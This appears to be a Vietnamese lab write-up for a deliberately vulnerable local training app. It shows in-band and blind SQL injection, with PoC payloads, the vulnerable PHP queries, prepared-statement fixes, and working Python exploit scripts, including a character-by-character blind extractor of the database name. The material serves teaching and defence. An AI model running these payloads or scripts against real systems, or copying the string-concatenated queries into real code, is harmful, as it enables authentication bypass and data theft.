1. In-band SQL

- URL: `http://127.0.0.1/OhMyCrab/modules/sqli/inband.php`

- Ứng dụng tồn tại lỗ hổng In-Band SQL Injection do dữ liệu đầu vào từ username và password được chèn trực tiếp vào câu truy vấn SQL mà không sử dụng prepared statement hoặc escaping phù hợp. Attacker có thể chèn payload SQL để bypass authentication hoặc trích xuất dữ liệu từ database.

- PoC

+ Intercept request `/OhMyCrab/modules/sqli/inband.php`.
  
+ Thay giá trị `username` bằng payload: `'OR 1=1 -- -`
  
+ Forward request → Hiển thị "Đăng nhập thành công"

+ Kết quả PoC cho lỗ hổng In-band SQL:

<img width="890" height="444" alt="image" src="https://github.com/user-attachments/assets/6bd469f6-8e87-4bc6-b67b-6284389f612a" />

- Phân tích source code

```
    $message = "";
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $username = $_POST['username'];
        $password = $_POST['password'];
        $sql = "SELECT * FROM sqli_accounts WHERE username='$username' AND password='$password'";
        $result = mysqli_query($conn, $sql);
        logAttack(1, $username . " | " . $password, 200);
        if (mysqli_num_rows($result) > 0) {
            $message = "<p style='color:lime'>Đăng nhập thành công</p>";
        } else {
            $message = "<p style='color:red'>Thông tin xác thực không hợp lệ</p>";
        }
    }
```

Đoạn code trên lỗi do biến $username và $password nhận trực tiếp dữ liệu rồi nối thẳng vào câu truy vấn SQL mà không qua bất kỳ cơ chế lọc hay kiểm tra dữ liệu nào.

- Cách khắc phục

```
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $username = $_POST['username'];
        $password = $_POST['password'];
        $stmt = mysqli_prepare($conn, "SELECT * FROM sqli_accounts WHERE username=? AND password=?");
        mysqli_stmt_bind_param($stmt, "ss", $username, $password);
        mysqli_stmt_execute($stmt);
        $result = mysqli_stmt_get_result($stmt);
        logAttack(1, $username . " | " . $password, 200);
        if (mysqli_num_rows($result) > 0) {
            $message = "<p style='color:lime'>Đăng nhập thành công</p>";
        } else {
            $message = "<p style='color:red'>Thông tin xác thực không hợp lệ</p>";
        }
    }
```

Sử dụng Prepared Statements: hàm `mysqli_prepare` và `mysqli_stmt_bind_param`. `?` thay thế input trực tiếp. `bind_param()` đảm bảo input là data, không phải SQL code.

- Script khai thác

```
import requests

url = "http://127.0.0.1/OhMyCrab/modules/sqli/inband.php"

data = {
    "username": "' OR 1=1 --",
    "password": "anything"
}

r = requests.post(url, data=data)

if "Đăng nhập thành công" in r.text:
    print("SQL Injection successful (login bypass)")
else:
    print("Failed")
```

2. Blind SQL

- URL: `http://127.0.0.1/OhMyCrab/modules/sqli/blind.php`

- Ứng dụng tồn tại lỗ hổng Blind SQL Injection do tham số id được chèn trực tiếp vào câu truy vấn SQL mà không sử dụng prepared statement. Phản hồi không trả dữ liệu trực tiếp mà chỉ trả về thông báo logic (“Người dùng tồn tại” / “Người dùng không tồn tại”), cho phép attacker suy luận dữ liệu thông qua phản hồi đúng/sai.

- PoC:

+ Send to repeater request: `http://127.0.0.1/OhMyCrab/modules/sqli/blind.php?id=1`

+ Test payload:

`'AND 1=1-- -`

<img width="904" height="485" alt="image" src="https://github.com/user-attachments/assets/2714afba-e4be-4cfd-981a-80bde9cbd132" />

`'AND 1=2-- -`

<img width="856" height="440" alt="image" src="https://github.com/user-attachments/assets/7bf7012e-24c1-4baa-b106-d99ac77b57b0" />

Attacker có thể: brute force từng ký tự của database, dump username/password

- Phân tích source code

```
    if (isset($_GET['id'])) {
        $id = $_GET['id'];
        /* Vulnerable Query */
        $sql = " SELECT * FROM sqli_accounts WHERE id='$id'";
        $result = mysqli_query($conn, $sql);
        /* Logging */
        logAttack(2, $id, 200);
        /* Blind Result */
        if (mysqli_num_rows($result) > 0) {
            $message = "<p style='color:lime'>Người dùng tồn tại</p>";
        } else {
            $message = "<p style='color:red'>Người dùng không tồn tại</p>";
        }
    }
```

Nhận dữ liệu đầu vào qua phương thức `GET['id']`, thực hiện nối chuỗi trực tiếp vào truy vấn SQL. Kẻ tấn công có thể chèn các mệnh đề logic kèm các hàm cắt chuỗi để ép database xử lý. Do cơ chế kiểm tra kết quả dựa hoàn toàn vào hàm mysqli_num_rows($result) > 0, ứng dụng vô tình tiết lộ dữ liệu.

- Cách khắc phục

```
    if (isset($_GET['id'])) {
        $id = $_GET['id'];
        // Sử dụng Prepared Statement để ngăn chặn SQL Injection
        $stmt = mysqli_prepare($conn, "SELECT * FROM sqli_accounts WHERE id=?");
        mysqli_stmt_bind_param($stmt, "i", $id); // "i" là kiểu dữ liệu int
        mysqli_stmt_execute($stmt);
        $result = mysqli_stmt_get_result($stmt);
        logAttack(2, $id, 200);
        if (mysqli_num_rows($result) > 0) {
            $message = "<p style='color:lime'>Người dùng tồn tại</p>";
        } else {
            $message = "<p style='color:red'>Người dùng không tồn tại</p>";
        }
    }
```

Thay thế việc nối chuỗi bằng cơ chế Prepared Statement. Chỉ định rõ tham số truyền vào là dạng số nguyên "i" thông qua hàm mysqli_stmt_bind_param giúp chặn việc chèn ký tự. Mọi payload SQL injection truyền vào lúc này chỉ được coi là giá trị ID bình thường.

- Script khai thác

```
import requests

url = "http://127.0.0.1/OhMyCrab/modules/sqli/blind.php"
database_name = ""

print("Đang dò tìm tên Database, vui lòng đợi...")

# Vòng lặp ký tự 
for position in range(1, 31):
    found = False
    # Duyệt các mã ASCII từ 32 (khoảng trắng) đến 126 (ký tự '~')
    for ascii_code in range(32, 127):
        # MySQL so sánh bằng mã số ASCII để tránh lỗi Collation chuỗi
        payload = f"1' AND ASCII(SUBSTRING(database(),{position},1))={ascii_code} -- -"
        params = {
            "id": payload
        }
        try:
            r = requests.get(url, params=params)
            if "Người dùng tồn tại" in r.text:
                database_name += chr(ascii_code)
                print(f"Ký tự thứ {position}: {chr(ascii_code)} (Mã ASCII: {ascii_code})")
                found = True
                break
        except requests.exceptions.RequestException as e:
            print(f"Lỗi kết nối: {e}")
            break
    # Nếu chạy hết bảng mã ASCII mà không thấy ký tự nào đúng nữa -> Đã tìm xong tên DB
    if not found:
        break
print("-" * 30)
if database_name:
    print(f"==> Tên database: {database_name}")
else:
    print("Không khai thác được. Vui lòng kiểm tra lại URL hoặc Payload.")
```

Sử dụng hàm ASCII() để chuyển đổi ký tự trả về từ SUBSTRING() thành số để tránh lỗi so sánh chuỗi. Khi tìm được số chính xác khiến trang web trả về "Người dùng tồn tại", script dùng hàm chr() trong Python để dịch ngược số đó thành chữ và cộng dồn vào chuỗi kết quả. Khi dịch sang vị trí tiếp theo mà không có mã ASCII nào khớp, câu lệnh SUBSTRING đã chạm tới cuối chuỗi (chuỗi rỗng), script sẽ tự động dừng lại và in ra kết quả cuối cùng.
